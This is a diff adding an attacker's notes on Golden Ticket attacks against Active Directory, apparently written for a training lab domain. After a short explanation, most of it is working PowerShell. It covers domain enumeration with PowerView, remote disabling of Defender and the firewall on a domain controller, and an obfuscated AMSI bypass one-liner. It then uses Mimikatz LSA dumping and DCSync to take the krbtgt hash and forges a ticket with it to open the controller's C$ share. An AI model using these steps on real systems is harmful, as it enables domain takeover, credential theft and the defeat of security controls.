@@ -1,0 +1,41 @@
+Golden Ticket attacks can be carried out against Active Directory domains, where access control is implemented using Kerberos tickets issued to authenticated users by a Key Distribution Service. The attacker gains control over the domain’s Key Distribution Service account (KRBTGT account) by stealing its NTLM hash. This allows the attacker to generate Ticket Granting Tickets (TGTs) for any account in the Active Directory domain. With valid TGTs, the attacker can request access to any resource/system on its domain from the Ticket Granting Service (TGS).
+
+Because the attacker is controlling the component of the access control system that is responsible for issuing Ticket Granting Tickets (TGTs), then he has the golden ticket to access any resource on the domain.
+
+. .\Powerview.ps1
+Get-DomainUser -SamAccountName Administrator
+
+#Do Over the PAss hash with an user with access to the DC
+#Execute mimikatz on DC as DA to get krbtgt hash
+$sess = New-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+
+
+#Disable Firewall and AV
+Invoke-Command -ScriptBlock{Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess
+Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
+Invoke-Command -ScriptBlock{netsh advfirewall set allprofiles state off} -Session $sess
+Invoke-Command -Session $sess -FilePath c:\AD\Tools\Invoke-mimikatz.ps1
+
+#Enter Session
+Enter-PSsession $sess
+
+
+#ByPass AMSI
+powershell -ep bypass
+SET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+
+#Get all the hash and the important krbtgt
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+
+#Get krbtgt silently
+The DCSync is a mimikatz feature which will try to impersonate a domain controller and request account password information from the targeted domain controller. This technique is less noisy as it doesn’t require direct access to the domain controller or retrieving the NTDS.DIT file over the network.
+
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+
+
+#On any machine
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:513 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+klist
+ls \\dcorp-dc\c$
+cd \\dcorp-dc\c$
